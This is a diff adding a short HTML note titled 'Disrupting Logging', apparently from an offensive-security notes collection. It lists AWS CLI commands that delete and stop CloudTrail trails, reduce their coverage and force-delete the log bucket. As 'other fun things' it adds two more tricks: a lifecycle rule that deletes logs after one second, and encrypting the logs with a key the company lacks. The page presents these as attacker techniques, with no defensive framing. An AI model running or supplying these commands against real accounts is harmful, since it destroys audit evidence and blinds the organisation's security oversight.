@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Disrupting Logging</title>
+</head><body>In regards to Cloudtrail, here are some commands to interact with logs<br/>
+aws cloudtrail delete-trail --name CloudTrail<br/>
+aws cloudtrail stop-logging --name CloudTrail<br/>
+aws cloudtrail update-trail --name CloudTrain --no-is-multi-region-trail --no-include-global-service-events<br/>
+aws s3 rb --force s3://mu-cloudtrail-bucket<br/>
+<br/>
+Other fun things<br/>
+S3 lifecycle rule to delete logs after 1 second<br/>
+Encrypt the logs with a key the company doesn't have</body></html>
